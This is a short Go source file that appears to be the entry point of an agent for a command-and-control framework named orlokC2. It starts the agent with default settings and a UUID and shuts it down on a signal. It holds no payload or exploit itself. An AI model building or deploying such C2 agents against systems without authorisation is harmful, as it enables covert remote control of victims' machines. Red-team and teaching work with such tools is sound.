package main

import (
	"fmt"
	"github.com/faanross/orlokC2/internal/agent/agent"
	"github.com/faanross/orlokC2/internal/agent/config"
	"github.com/google/uuid"
	"syscall"

	// imports here
	"os"
	"os/signal"
)

func main() {
	// Set up signal handling for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	// Initialize configuration with defaults
	agentConfig := config.NewConfig()

	//UUID
	agentConfig.AgentUUID = uuid.New().String()

	// Create agent instance
	c2Agent := agent.NewAgent(agentConfig)

	// Start agent
	err := c2Agent.Start()
	if err != nil {
		fmt.Printf("Failed to start agent: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("Agent started!")
	fmt.Printf("Connected to: %s\n", c2Agent.GetTargetAddress())

	// Wait for termination signal
	<-sigChan

	// Gracefully stop the agent
	fmt.Println("Shutting down agent...")
	c2Agent.Stop()

}
